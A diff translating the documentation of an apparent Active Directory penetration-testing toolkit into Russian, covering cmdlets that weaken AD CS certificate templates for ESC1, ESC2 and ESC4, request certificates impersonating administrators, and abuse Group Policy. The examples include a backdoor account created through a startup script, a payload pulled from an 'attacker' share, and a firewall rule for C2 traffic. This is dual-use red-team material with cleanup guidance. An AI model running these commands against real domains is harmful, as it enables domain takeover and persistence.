@@ -401,32 +401,32 @@ Set-DomainGroup -Identity "Domain Admins" -GrantRights WriteMembers -Principal "
 
 ## Set-CertificateTemplate
 
-Modifies AD CS certificate templates for ESC attacks.
+Изменяет шаблоны сертификатов AD CS для оценки уязвимостей ESC.
 
-### Available Operations
+### Доступные операции
 
-| Operation | Parameter | Description | Attack Technique |
+| Операция | Параметр | Описание | Техника атаки |
 |-----------|-----------|-------------|------------------|
-| **Allow Enrollee Supplies Subject** | `-AllowEnrolleeSuppliesSubject` | Enable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT | ESC1 |
-| **Add Client Authentication** | `-AddClientAuthentication` | Add Client Auth EKU | ESC1/ESC2 |
-| **Allow Exportable Key** | `-AllowExportableKey` | Enable key export | Key theft |
-| **Remove Manager Approval** | `-RemoveManagerApproval` | Disable approval requirement | ESC1 |
-| **Grant Enrollment** | `-GrantEnrollment` | Grant enrollment permission | ESC4 |
-| **Grant Full Control** | `-GrantFullControl` | Grant GenericAll | ESC4 |
-| **Grant Write** | `-GrantWrite` | Grant WriteProperty | ESC4 |
-| **Revoke Enrollment** | `-RevokeEnrollment` | Remove enrollment permission | Cleanup |
-| **Disable Enrollee Supplies Subject** | `-DisableEnrolleeSuppliesSubject` | Restore CA-supplied subject | Cleanup |
-| **Add Manager Approval** | `-AddManagerApproval` | Require approval | Cleanup |
-| **Remove EKU** | `-RemoveEKU` | Remove specific EKU | Cleanup |
-| **Add Any Purpose EKU** | `-AddAnyPurposeEKU` | Add Any Purpose (2.5.29.37.0) | ESC2 |
-| **Clear EKUs** | `-ClearEKUs` | Remove all EKUs | ESC2 |
-| **Add Smartcard Logon** | `-AddSmartcardLogon` | Add Smartcard Logon EKU | PKINIT |
-| **Set Owner** | `-SetOwner` | Take ownership | ESC4 |
-| **Grant AutoEnroll** | `-GrantAutoEnroll` | Grant auto-enrollment | Persistence |
-| **Export** | `-Export` | Backup template to JSON | Backup |
-| **Import** | `-Import` | Restore template from JSON backup | Restore |
+| **Разрешить субъект от заявителя** | `-AllowEnrolleeSuppliesSubject` | Включить CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT | ESC1 |
+| **Добавить аутентификацию клиента** | `-AddClientAuthentication` | Добавить EKU Client Authentication | ESC1/ESC2 |
+| **Разрешить экспорт ключа** | `-AllowExportableKey` | Разрешить экспорт ключа | Кража ключей |
+| **Убрать одобрение руководителя** | `-RemoveManagerApproval` | Отключить требование одобрения | ESC1 |
+| **Выдать право получения сертификата** | `-GrantEnrollment` | Предоставить разрешение Enroll | ESC4 |
+| **Выдать полный контроль** | `-GrantFullControl` | Предоставить GenericAll | ESC4 |
+| **Выдать право записи** | `-GrantWrite` | Предоставить WriteProperty | ESC4 |
+| **Отозвать право получения сертификата** | `-RevokeEnrollment` | Удалить разрешение Enroll | Очистка |
+| **Запретить субъект от заявителя** | `-DisableEnrolleeSuppliesSubject` | Восстановить выдачу имени субъекта центром сертификации | Очистка |
+| **Вернуть одобрение руководителя** | `-AddManagerApproval` | Включить обязательное одобрение | Очистка |
+| **Удалить EKU** | `-RemoveEKU` | Удалить указанный EKU | Очистка |
+| **Добавить EKU Any Purpose** | `-AddAnyPurposeEKU` | Добавить Any Purpose (2.5.29.37.0) | ESC2 |
+| **Очистить EKU** | `-ClearEKUs` | Удалить все EKU | ESC2 |
+| **Добавить вход со смарт-картой** | `-AddSmartcardLogon` | Добавить EKU Smartcard Logon | PKINIT |
+| **Назначить владельца** | `-SetOwner` | Получить владение | ESC4 |
+| **Выдать автозачисление** | `-GrantAutoEnroll` | Предоставить право автоматической регистрации | Закрепление доступа |
+| **Экспорт** | `-Export` | Резервная копия шаблона в JSON | Резервирование |
+| **Импорт** | `-Import` | Восстановить шаблон из резервного JSON | Восстановление |
 
-### Syntax
+### Синтаксис
 
 ```powershell
 Set-CertificateTemplate
@@ -454,64 +454,64 @@ Set-CertificateTemplate
     [-Credential <PSCredential>]
 ```
 
-### Examples
+### Примеры
 
 ```powershell
-# ESC1: Make template vulnerable
+# ESC1: сделать шаблон уязвимым
 Set-CertificateTemplate -Identity "WebServer" -AllowEnrolleeSuppliesSubject -AddClientAuthentication -RemoveManagerApproval
-# Template is now vulnerable to ESC1!
+# Теперь шаблон уязвим к ESC1!
 
-# ESC2: Add Any Purpose EKU
+# ESC2: добавить EKU Any Purpose
 Set-CertificateTemplate -Identity "User" -AddAnyPurposeEKU
-# Certificate can be used for any purpose!
+# Сертификат можно использовать для любого назначения!
 
-# ESC4: Grant enrollment to low-priv user
+# ESC4: выдать право Enroll пользователю с низкими привилегиями
 Set-CertificateTemplate -Identity "DomainController" -GrantEnrollment "CONTOSO\LowPrivUser"
-# User can now enroll in DC template!
+# Теперь пользователь может запросить сертификат по шаблону DC!
 
-# Add Smartcard Logon for PKINIT
+# Добавить EKU Smartcard Logon для PKINIT
 Set-CertificateTemplate -Identity "SmartcardUser" -AddSmartcardLogon
 
-# Backup template before modification
+# Сделать резервную копию шаблона до изменения
 Set-CertificateTemplate -Identity "WebServer" -Export "C:\Backup\WebServer.json"
 
-# Restore template from backup
+# Восстановить шаблон из резервной копии
 Set-CertificateTemplate -Import "C:\Backup\WebServer.json"
 
-# Cleanup: Revert ESC1 changes
+# Очистка: отменить изменения ESC1
 Set-CertificateTemplate -Identity "WebServer" -DisableEnrolleeSuppliesSubject -AddManagerApproval
 
-# Cleanup: Revoke enrollment
+# Очистка: отозвать право Enroll
 Set-CertificateTemplate -Identity "WebServer" -RevokeEnrollment "CONTOSO\TestUser"
 ```
 
-### ESC Attack Matrix
+### Матрица атак ESC
 
-| ESC | Vulnerability | Parameter |
+| ESC | Уязвимость | Параметр |
 |-----|---------------|-----------|
-| ESC1 | Enrollee supplies subject + Client Auth | `-AllowEnrolleeSuppliesSubject -AddClientAuthentication` |
-| ESC2 | Any Purpose EKU | `-AddAnyPurposeEKU` |
-| ESC2 | No EKUs | `-ClearEKUs` |
-| ESC4 | Vulnerable ACL | `-GrantEnrollment`, `-GrantFullControl` |
+| ESC1 | Имя субъекта задаёт заявитель + EKU Client Auth | `-AllowEnrolleeSuppliesSubject -AddClientAuthentication` |
+| ESC2 | EKU Any Purpose | `-AddAnyPurposeEKU` |
+| ESC2 | Отсутствуют EKU | `-ClearEKUs` |
+| ESC4 | Уязвимый ACL | `-GrantEnrollment`, `-GrantFullControl` |
 
 ---
 
 ## Request-ADCSCertificate
 
-Requests a certificate from an ADCS Certificate Authority via the `/certsrv/` Web Enrollment endpoint. Generates a PKCS#10 CSR, submits it, retrieves the issued certificate, and saves it as a PFX file. Supports ESC1 and ESC4 exploitation.
+Запрашивает сертификат у центра сертификации AD CS через веб-регистрацию `/certsrv/`. Формирует запрос PKCS#10 (CSR), отправляет его, получает выпущенный сертификат и сохраняет в PFX. Поддерживает тестирование ESC1 и ESC4.
 
-### Available Operations
+### Доступные операции
 
-| Operation                | Parameter                           | Description                                   | Attack Technique       |
+| Операция                | Параметр                           | Описание                                   | Техника атаки       |
 | ------------------------ | ----------------------------------- | --------------------------------------------- | ---------------------- |
-| **Basic Request**        | `-TemplateName`                     | Request certificate from a template           | Certificate enrollment |
-| **Impersonate User**     | `-Impersonate "admin@contoso.com"`  | Request certificate as another user (UPN SAN) | ESC1                   |
-| **Impersonate Computer** | `-Impersonate "srv-dc.contoso.com"` | Request certificate with DNS SAN              | ESC1                   |
-| **Custom Subject/SAN**   | `-Subject -UPN -DNS`                | Manual subject and SAN control                | ESC1                   |
-| **Modify Template**      | `-ModifyTemplate`                   | Temporarily modify template for exploitation  | ESC4                   |
-| **No Password**          | `-NoPassword`                       | Export PFX without password protection        | Convenience            |
+| **Обычная заявка**        | `-TemplateName`                     | Запрос сертификата по шаблону              | Выдача сертификата |
+| **Запрос от имени пользователя**     | `-Impersonate "admin@contoso.com"`  | Запрос на имя другого пользователя (UPN в SAN) | ESC1 |
+| **Запрос от имени компьютера** | `-Impersonate "srv-dc.contoso.com"` | Запрос с DNS в SAN              | ESC1 |
+| **Свой Subject/SAN**   | `-Subject -UPN -DNS`                | Явное управление субъектом и SAN                | ESC1 |
+| **Изменить шаблон**      | `-ModifyTemplate`                   | Временно изменить шаблон для проверки         | ESC4 |
+| **Без пароля**          | `-NoPassword`                       | Экспорт PFX без парольной защиты        | Упрощение             |
 
-### Syntax
+### Синтаксис
 
 ```powershell
 Request-ADCSCertificate
@@ -534,94 +534,94 @@ Request-ADCSCertificate
     [-Server <String>]
 ```
 
-### Parameters
+### Параметры
 
-| Parameter | Type | Description |
+| Параметр | Тип | Описание |
 |-----------|------|-------------|
-| `-TemplateName` | String | Certificate template name (e.g., "User", "WebServer") |
-| `-CAServer` | String | FQDN of the CA server. If not specified, auto-discovers from AD. |
-| `-Impersonate` | String | Username, UPN, or FQDN to impersonate. Auto-resolves Subject and SAN. |
-| `-Subject` | String | Certificate subject name. "CN=" prefix added automatically if omitted. |
-| `-UPN` | String | User Principal Name for SAN (e.g., "admin@contoso.com") |
-| `-DNS` | String[] | DNS hostnames for SAN (e.g., "dc01.contoso.com") |
-| `-KeyLength` | Int | RSA key length in bits. Default: 2048. |
-| `-OutputPath` | String | Path for PFX file. Default: auto-generated from subject. |
-| `-Credential` | PSCredential | Credentials for HTTP authentication against certsrv. |
-| `-ModifyTemplate` | Switch | ESC4: Temporarily modify template, request cert, then restore. |
-| `-UseHTTP` | Switch | Use HTTP instead of HTTPS for certsrv requests. |
-| `-NoPassword` | Switch | Export PFX without password protection. |
-| `-PassThru` | Switch | Return result object instead of console output. |
-| `-Force` | Switch | Overwrite existing PFX file without prompting. |
+| `-TemplateName` | String | Имя шаблона сертификата (например, "User" или "WebServer") |
+| `-CAServer` | String | FQDN сервера УЦ; при отсутствии автоматически определяется из AD |
+| `-Impersonate` | String | Имя, UPN или FQDN, под которым запрашивается сертификат; Subject и SAN вычисляются автоматически |
+| `-Subject` | String | Имя субъекта; префикс "CN=" автоматически добавляется при отсутствии |
+| `-UPN` | String | Имя UPN в SAN (например, "admin@contoso.com") |
+| `-DNS` | String[] | DNS-имена узлов в SAN (например, "dc01.contoso.com") |
+| `-KeyLength` | Int | Длина RSA-ключа в битах; по умолчанию 2048 |
+| `-OutputPath` | String | Путь к PFX; по умолчанию формируется на основе субъекта |
+| `-Credential` | PSCredential | Учётные данные для HTTP-аутентификации к certsrv |
+| `-ModifyTemplate` | Switch | ESC4: временное изменение шаблона, запрос сертификата и восстановление |
+| `-UseHTTP` | Switch | Использовать HTTP вместо HTTPS для certsrv |
+| `-NoPassword` | Switch | Экспортировать PFX без парольной защиты |
+| `-PassThru` | Switch | Вернуть объект результата вместо вывода в консоль |
+| `-Force` | Switch | Перезаписать существующий PFX без запроса подтверждения |
 
-### CA Auto-Discovery
+### Автообнаружение центра сертификации
 
-When `-CAServer` is not specified, `Request-ADCSCertificate` automatically:
+Если `-CAServer` не задан, `Request-ADCSCertificate` автоматически:
 
-1. Discovers all CAs from Active Directory
-2. Filters CAs that publish the requested template
-3. Tests reachability (HTTPS first, HTTP fallback)
-4. Falls back to the next CA if the first is unreachable
+1. Находит все центры сертификации через Active Directory.
+2. Отбирает УЦ, публикующие нужный шаблон.
+3. Проверяет доступность (сначала HTTPS, затем HTTP).
+4. При недоступности первого УЦ пробует следующий.
 
-### -Impersonate Convenience Parameter
+### Удобный параметр -Impersonate
 
-The `-Impersonate` parameter accepts three formats and automatically derives Subject and SAN:
+`-Impersonate` поддерживает три формата и автоматически определяет Subject и SAN:
 
-| Input | Detected As | Subject | SAN |
+| Ввод | Определяется как | Subject | SAN |
 |-------|-------------|---------|-----|
-| `"administrator"` | Username | CN=administrator | UPN:administrator@contoso.com |
+| `"administrator"` | Имя пользователя | CN=administrator | UPN:administrator@contoso.com |
 | `"admin@contoso.com"` | UPN | CN=admin | UPN:admin@contoso.com |
 | `"srv-dc.contoso.com"` | FQDN | CN=srv-dc | DNS:srv-dc.contoso.com |
 
-### Examples
+### Примеры
 
 ```powershell
-# Basic enrollment with auto-discovered CA
+# Обычная регистрация с автоматическим обнаружением УЦ
 Request-ADCSCertificate -TemplateName "User"
 
-# ESC1: Request certificate as Administrator
+# ESC1: запрос сертификата на имя Administrator
 Request-ADCSCertificate -TemplateName "VulnTemplate" -Impersonate "administrator"
 
-# ESC1: With explicit subject and UPN SAN
+# ESC1: явно указать Subject и UPN в SAN
 Request-ADCSCertificate -TemplateName "VulnTemplate" -Subject "Administrator" -UPN "administrator@contoso.com"
 
-# ESC1: Computer certificate with DNS SAN
+# ESC1: сертификат компьютера с DNS в SAN
 Request-ADCSCertificate -TemplateName "Machine" -Impersonate "dc01.contoso.com"
 
-# ESC4: Temporarily modify template, request cert, then restore
+# ESC4: временно изменить шаблон, запросить сертификат и восстановить
 Request-ADCSCertificate -TemplateName "WebServer" -ModifyTemplate -Impersonate "administrator"
 
-# With explicit CA server and credentials
+# Указать сервер УЦ и учётные данные явно
 Request-ADCSCertificate -CAServer "ca01.contoso.com" -TemplateName "User" -Credential (Get-Credential)
 
-# PFX without password (convenient for follow-up commands)
+# PFX без пароля (удобно для последующих команд)
 Request-ADCSCertificate -TemplateName "User" -NoPassword
 
-# Scripting with -PassThru
+# Использование `-PassThru` в сценарии
 $result = Request-ADCSCertificate -TemplateName "VulnTemplate" -Impersonate "admin" -PassThru
 Connect-adPEAS -Domain "contoso.com" -Certificate $result.PFXPath -CertificatePassword $result.PFXPassword
 ```
 
-### ESC4 Workflow (-ModifyTemplate)
+### Последовательность ESC4 (-ModifyTemplate)
 
-The `-ModifyTemplate` parameter automates the full ESC4 attack chain:
+Параметр `-ModifyTemplate` автоматизирует полную цепочку проверки ESC4:
 
 ```
-1. Backup template to JSON file
+1. Сохранить резервную копию шаблона в JSON
         ↓
-2. Modify template:
+2. Изменить шаблон:
    - AllowEnrolleeSuppliesSubject (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
    - AddClientAuthentication EKU
    - AllowExportableKey
    - RemoveManagerApproval
         ↓
-3. Request certificate with specified Subject/SAN
+3. Запросить сертификат с заданными Subject/SAN
         ↓
-4. Restore original template from backup (always, even on error)
+4. Восстановить исходный шаблон из копии (всегда, даже при ошибке)
 ```
 
-Requires WriteDACL, WriteProperty, or GenericAll on the template object. The backup file is kept after restore for audit purposes.
+Требует WriteDACL, WriteProperty либо GenericAll на объекте шаблона. Файл резервной копии сохраняется после восстановления для аудита.
 
-### Output (Console)
+### Пример консольного вывода
 
 ```
 [*] Found 2 Certificate Authority(ies) in Active Directory
@@ -643,7 +643,7 @@ Requires WriteDACL, WriteProperty, or GenericAll on the template object. The bac
     Connect-adPEAS -Domain contoso.com -Certificate 'administrator_20260219_120000.pfx' -CertificatePassword 'K8#mP2@xL9!nQ4$wR7'
 ```
 
-### Output (-PassThru)
+### Результат (-PassThru)
 
 ```powershell
 [PSCustomObject]@{
@@ -664,35 +664,35 @@ Requires WriteDACL, WriteProperty, or GenericAll on the template object. The bac
 
 ## Set-DomainGPO
 
-Modifies Group Policy Objects for persistence and privilege escalation.
+Изменяет объекты групповой политики для проверки закрепления доступа и повышения привилегий.
 
-### Available Operations
+### Доступные операции
 
-| Operation | Parameter | Description | Attack Technique |
+| Операция | Параметр | Описание | Техника атаки |
 |-----------|-----------|-------------|------------------|
-| **Link GPO** | `-LinkTo` | Link GPO to OU/Domain | Apply policy |
-| **Unlink GPO** | `-UnlinkFrom` | Remove GPO link | Cleanup |
-| **Set Owner** | `-Owner` | Take ownership | ACL abuse |
-| **Grant Rights** | `-GrantRights -Principal` | Add ACL permissions | Persistence |
-| **Add Scheduled Task** | `-AddScheduledTask` | Create immediate scheduled task via GPO | Code execution |
-| **Add Local Group Member** | `-AddLocalGroupMember` | Add user to local group via GPO | Local admin |
-| **Add Startup Script** | `-AddStartupScript` | Deploy machine startup script | Persistence |
-| **Add Logon Script** | `-AddLogonScript` | Deploy user logon script | Persistence |
-| **Add Service** | `-AddService` | Install Windows service via GPO | Persistence |
-| **Deploy File** | `-DeployFile` | Copy file via GPO | Payload delivery |
-| **Add Firewall Rule** | `-AddFirewallRule` | Create firewall rule via GPO | Network access |
-| **Sync SYSVOL** | `-SyncSYSVOL` | Sync AD permissions to SYSVOL | Fix permissions |
-| **Export (Backup)** | `-Export` | Snapshot GPO (AD attrs + full SYSVOL tree) to JSON | Backup before change |
-| **Import (Restore)** | `-Import` | Restore GPO server-side from JSON backup | Cleanup |
-| **Remove Scheduled Task** | `-RemoveScheduledTask -TaskName` | Surgically remove an injected task | Cleanup |
-| **Remove Local Group Member** | `-RemoveLocalGroupMember -LocalGroup -MemberToAdd` | Remove an injected member | Cleanup |
-| **Remove Service** | `-RemoveService -ServiceName` | Remove an injected service | Cleanup |
-| **Remove Deployed File** | `-RemoveDeployedFile -FileName` | Remove an injected file deployment | Cleanup |
-| **Remove Firewall Rule** | `-RemoveFirewallRule -RuleName` | Remove an injected firewall rule | Cleanup |
-| **Remove Startup Script** | `-RemoveStartupScript -ScriptName` | Remove an injected startup script | Cleanup |
-| **Remove Logon Script** | `-RemoveLogonScript -ScriptName` | Remove an injected logon script | Cleanup |
+| **Привязать GPO** | `-LinkTo` | Привязать GPO к OU/домену | Применение политики |
+| **Отвязать GPO** | `-UnlinkFrom` | Удалить привязку GPO | Очистка |
+| **Назначить владельца** | `-Owner` | Получить владение | Злоупотребление ACL |
+| **Выдать права** | `-GrantRights -Principal` | Добавить разрешения ACL | Закрепление доступа |
+| **Добавить запланированное задание** | `-AddScheduledTask` | Создать немедленное задание через GPO | Выполнение кода |
+| **Добавить участника локальной группы** | `-AddLocalGroupMember` | Добавить пользователя в локальную группу через GPO | Локальный администратор |
+| **Добавить сценарий запуска** | `-AddStartupScript` | Развернуть сценарий запуска компьютера | Закрепление доступа |
+| **Добавить сценарий входа** | `-AddLogonScript` | Развернуть сценарий входа пользователя | Закрепление доступа |
+| **Добавить службу** | `-AddService` | Установить службу Windows через GPO | Закрепление доступа |
+| **Развернуть файл** | `-DeployFile` | Копировать файл через GPO | Доставка содержимого |
+| **Добавить правило брандмауэра** | `-AddFirewallRule` | Создать правило брандмауэра через GPO | Сетевой доступ |
+| **Синхронизировать SYSVOL** | `-SyncSYSVOL` | Синхронизировать разрешения AD и SYSVOL | Исправление разрешений |
+| **Экспорт (резервная копия)** | `-Export` | Снимок GPO (атрибуты AD и полное дерево SYSVOL) в JSON | Резервирование перед изменениями |
+| **Импорт (восстановление)** | `-Import` | Восстановить GPO из JSON-копии на сервере | Очистка |
+| **Удалить запланированное задание** | `-RemoveScheduledTask -TaskName` | Точечно удалить добавленное задание | Очистка |
+| **Удалить участника локальной группы** | `-RemoveLocalGroupMember -LocalGroup -MemberToAdd` | Удалить добавленного участника | Очистка |
+| **Удалить службу** | `-RemoveService -ServiceName` | Удалить добавленную службу | Очистка |
+| **Удалить развёрнутый файл** | `-RemoveDeployedFile -FileName` | Удалить развёрнутый файл | Очистка |
+| **Удалить правило брандмауэра** | `-RemoveFirewallRule -RuleName` | Удалить добавленное правило | Очистка |
+| **Удалить сценарий запуска** | `-RemoveStartupScript -ScriptName` | Удалить добавленный сценарий запуска | Очистка |
+| **Удалить сценарий входа** | `-RemoveLogonScript -ScriptName` | Удалить добавленный сценарий входа | Очистка |
 
-### Syntax
+### Синтаксис
 
 ```powershell
 Set-DomainGPO
@@ -724,62 +724,62 @@ Set-DomainGPO
     [-Credential <PSCredential>]
 ```
 
-### Examples
+### Примеры
 
 ```powershell
-# Link GPO to OU
+# Привязать GPO к OU
 Set-DomainGPO -Identity "Malicious Policy" -LinkTo "OU=Servers,DC=contoso,DC=com"
 
-# Link with enforcement
+# Привязка с принудительным применением
 Set-DomainGPO -Identity "Malicious Policy" -LinkTo "OU=Servers,DC=contoso,DC=com" -LinkEnforced
 
-# Unlink GPO
+# Удалить привязку GPO
 Set-DomainGPO -Identity "Malicious Policy" -UnlinkFrom "OU=Servers,DC=contoso,DC=com"
 
-# Take ownership
+# Получить владение
 Set-DomainGPO -Identity "Default Domain Policy" -Owner "CONTOSO\attacker"
 
-# Grant edit permissions
+# Предоставить права на редактирование
 Set-DomainGPO -Identity "Default Domain Policy" -GrantRights GenericAll -Principal "CONTOSO\attacker"
 
-# Add immediate scheduled task (runs as SYSTEM)
+# Добавить немедленное задание (выполняется от SYSTEM)
 Set-DomainGPO -Identity "Backdoor Policy" -AddScheduledTask -TaskName "Update" -TaskCommand "cmd.exe" -TaskArguments "/c whoami > C:\temp\test.txt"
 
-# Add user to local Administrators via GPO
+# Добавить пользователя в локальные Administrators через GPO
 Set-DomainGPO -Identity "Admin Policy" -AddLocalGroupMember -LocalGroup "Administrators" -MemberToAdd "CONTOSO\attacker"
 
-# Deploy startup script
+# Развернуть сценарий запуска
 Set-DomainGPO -Identity "Script Policy" -AddStartupScript -ScriptContent "net user backdoor P@ss /add" -ScriptName "update.bat"
 
-# Install a Windows service via GPO
+# Установить службу Windows через GPO
 Set-DomainGPO -Identity "Service Policy" -AddService -ServiceName "UpdateSvc" -BinaryPath "C:\Windows\Temp\svc.exe" -StartType Automatic
 
-# Deploy a file via GPO
+# Развернуть файл через GPO
 Set-DomainGPO -Identity "Deploy Policy" -DeployFile -SourceFile "\\attacker\share\payload.exe" -DestinationPath "C:\Windows\Temp\update.exe" -FileAction Create
 
-# Add firewall rule allowing C2 traffic
+# Добавить правило брандмауэра, разрешающее C2-трафик
 Set-DomainGPO -Identity "FW Policy" -AddFirewallRule -RuleName "Allow Updates" -RuleDirection Outbound -RuleAction Allow -RuleProtocol TCP -RuleRemotePort 443
 
-# --- Backup / Revert (operator-driven, same idiom as Set-CertificateTemplate) ---
+# --- Резервная копия / откат (вручную оператором, как в Set-CertificateTemplate) ---
 
-# Back up the GPO BEFORE modifying it (AD attributes + full SYSVOL tree -> one JSON)
+# Сохранить GPO ДО изменения (атрибуты AD + всё дерево SYSVOL → один JSON)
 Set-DomainGPO -Identity "Default Domain Policy" -Export ".\DDP_backup.json"
 
-# Restore the GPO server-side from the backup (rewrites SYSVOL, deletes injected files,
-# restores extension attributes/version). Does NOT undo effects already applied on clients.
+# Восстановить GPO из копии на сервере (перезаписывает SYSVOL, удаляет внесённые файлы,
+# восстанавливает атрибуты расширений и версию). НЕ отменяет уже применённые изменения на клиентах.
 Set-DomainGPO -Identity "Default Domain Policy" -Import ".\DDP_backup.json"
 
-# Surgically remove a single injected payload by name (no JSON needed)
+# Точечно удалить одно добавленное содержимое по имени (JSON не нужен)
 Set-DomainGPO -Identity "Backdoor Policy" -RemoveScheduledTask -TaskName "Update"
 Set-DomainGPO -Identity "Admin Policy" -RemoveLocalGroupMember -LocalGroup "Administrators" -MemberToAdd "CONTOSO\attacker"
 Set-DomainGPO -Identity "Service Policy" -RemoveService -ServiceName "UpdateSvc"
 Set-DomainGPO -Identity "Script Policy" -RemoveStartupScript -ScriptName "update.bat"
 ```
 
-> **Note:** Backup/Revert is **operator-driven** — there is no automatic backup. Run `-Export`
-> before you modify a GPO. `-Import` and the `-Remove*` switches restore the **GPO definition
-> server-side**; they do not undo changes a Group Policy Preference already applied on clients
-> (e.g. a user already added to a local group). Revert those separately.
+> **Примечание.** Резервирование и откат выполняются **оператором** — автоматической резервной копии нет. Запускайте `-Export`
+> до изменения GPO. `-Import` и ключи `-Remove*` восстанавливают **определение GPO на
+> сервере**; они не отменяют изменения, уже применённые Group Policy Preferences на клиентах
+> (например, пользователя, добавленного в локальную группу). Такие изменения откатываются отдельно.
 
 ---
 
